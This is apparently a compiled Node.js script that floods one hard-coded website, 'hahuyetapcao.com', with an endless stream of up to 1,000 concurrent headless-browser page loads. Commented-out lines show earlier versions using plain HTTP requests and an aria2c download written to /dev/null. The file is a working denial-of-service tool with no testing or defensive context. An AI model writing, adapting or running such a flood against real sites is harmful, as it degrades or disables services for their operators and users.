"use strict";

var _axios = require("axios");

var _axios2 = _interopRequireDefault(_axios);

var _child_process = require("child_process");

var _child_process2 = _interopRequireDefault(_child_process);

var _TinyPage = require("./TinyPage");

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _asyncToGenerator(fn) { return function () { var gen = fn.apply(this, arguments); return new Promise(function (resolve, reject) { function step(key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { return Promise.resolve(value).then(function (value) { step("next", value); }, function (err) { step("throw", err); }); } } return step("next"); }); }; }

const axios = _axios2.default.create({ timeout: 10000 });
const _ = console.log;
const threshold = 1000;
const site = "http://hahuyetapcao.com/";

let count = 0;
let wait = Promise.resolve();

const call = (() => {
  var _ref = _asyncToGenerator(function* () {
    _("[count]", count);

    try {
      // await axios.get(site)
      // const wget = `aria2c -d /dev -o null --allow-overwrite=true --file-allocation=none --max-connection-per-server=4 ${site}`
      // await new Promise((resolve, reject) => {
      //   cpr.exec(wget, err => {
      //     if(err) return reject()
      //     resolve()
      //   })
      // })
      const page = yield (0, _TinyPage.TinyPage)();
      yield page.goto(site);
      _("[call] success");
    } catch (err) {
      _("[call] fail");
    } finally {
      count--;
      loop();
    }
  });

  return function call() {
    return _ref.apply(this, arguments);
  };
})();

const loop = () => {
  while (count < threshold) {
    count++;
    const waitCall = call();
    wait = wait.then(() => waitCall);
  }
};

_asyncToGenerator(function* () {
  loop();
  yield wait;
})();